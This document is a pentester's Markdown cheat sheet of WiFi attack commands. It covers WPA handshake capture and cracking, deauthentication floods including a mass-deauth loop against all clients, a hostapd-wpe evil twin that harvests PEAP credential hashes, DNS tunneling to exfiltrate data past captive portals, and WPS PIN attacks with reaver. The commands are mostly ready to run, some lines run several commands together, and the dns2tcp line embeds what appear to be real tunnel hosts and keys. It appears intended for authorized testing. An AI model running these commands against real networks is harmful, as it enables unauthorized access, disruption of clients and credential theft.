# WIFI

## **WPA**

1. Capture Handshake using airodump-ng 
2. Crack it locally using john or hashcat

### 1. Monitor mode

```sh
sudo airmon-ng start wlan0
```

### 2. Listen for specific bssid

```sh
sudo airodump-ng -a mon0
```

> find you target bssid \(mac\) and chanel

```sh
airodump-ng -c <channel> --bssid <MAC-BOX-CLIENT> --showack -w capture mon0
```

> don't forget the -w paramter to save the handshake !

### 3. DeAUTH

```sh
# DEAUTH all clients from a box
aireplay-ng mon0 -0 5 -b <MAC-BOX>

# DEAUTH specific client device
aireplay-ng mon0 -0 5 -a <MAC-BOX> -c <MAC-DEVICE-CLIENT> 


# DEAUTH massif (each client connected at each bssid of an essid)
for bssid in cat bssid_deauth.lst; do for mac in cat client_deauth.lst; do aireplay-ng mon.wlan0 -0 5 -a $bssid -c $mac --ignore-negative-one -e <ESSID_CLIENT> ; done ; done

```

### 4. Handshake cracking

Handshaked captured ? go crack it !

Crack with aircrack

```sh
aircrack-ng capture-01.cap --wordlist=<wordlist>
```

Crack with john

```bash
wpaclean capture.cap-01.clean.cap capture.cap-01.cap
aircrack-ng capture.cap-01.clean.cap -J capture.cap-01.hccap
hccap2john capture.cap-01.hccap > capture.cap-01.hccap.john
john --wordlist=<wordlist> capture.cap-01.hccap.john
```

Crack with hashcat

```sh
todo
```

---

## **PEAP**

1. `sudo apt install hostapd-wpe`
2. Configure same channel and essid than the client's one in hostapd conf
3. Disconnect clients devices \(see WPA - 3. DeAUTH\)

Log PEAP : hash client format john

```sh
cat peap_client_log.txt | grep username -A2 | sed '/^--/d' | awk '{print $2}' | tr -d ':' | awk 'NR%3{printf $0":";next;}1' | awk -F ':' '{print $1"::::"$3":"$2}'
```

> Vulnerability fix : GPO validate certificate

---

## **Captive portal**

### DNS tunneling

Try DNS tunneling to exfiltrate data over the internet

- [http://requestbin.net/dns](http://requestbin.net/dns)

- [dnscat2](https://github.com/iagox86/dnscat2)

```sh
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
bundle install
```

## Troubleshooting

### unblock wifi card

```bash
sudo nmcli nm wifi off
sudo nmcli radio wifi off
sudo rfkill unblock wlan
```

---

## **Todo**

### PEAP hash replay

* Spoof AP and replay hashed captured
  * [Sensepost berate_ap](https://github.com/sensepost/berate_ap)
  * [Sensepost sycophant](https://github.com/sensepost/wpa_sycophant)

### dns2tcp manually

création du tunel

```sh
dns2tcpc -z dnstun.lexsi.net -c -d 1 -l 9000 -r ssh 192.168.128.27 -k _bijour@lexsi_ dns2tcpc -z dnstun.lexsi.net -c -d 1 -l 9000 -r ssh 192.168.1.29 -k Q5xTEGHgqa8 ssh rsshdummy@127.0.0.1 -p 9000 -D 9010 -N -i rssh\_dummy\_dv\_new
```

mise en place du proxy local

```sh
ssh rssh@127.0.0.1 -p 9000 -D 9010 -N -i rssh.ssh
```

### WPS

```bash
airmon-ng check airmon-ng start wlan1 
wifite --showb --wpa --mon-iface wlan0mo 
airodump-ng -a wlan1mon --wps --essid-regex EDL time reaver -i wlan1mon -c 1 -b E8:FC:AF:9A:C9:B0 -K 1 
airodump-ng -a wlan1mon --essid-regex Internet 
wifite --showb --wpa --mon-iface wlan0mon --aircrack --pyrit --tshark --cowpatty --power 40
airmon-ng check airmon-ng start wlan0 
airodump-ng wlan0mon --wps --essid-regex VICTIM reaver -i wlan0mon -c $channel -b $bssid -K 1
```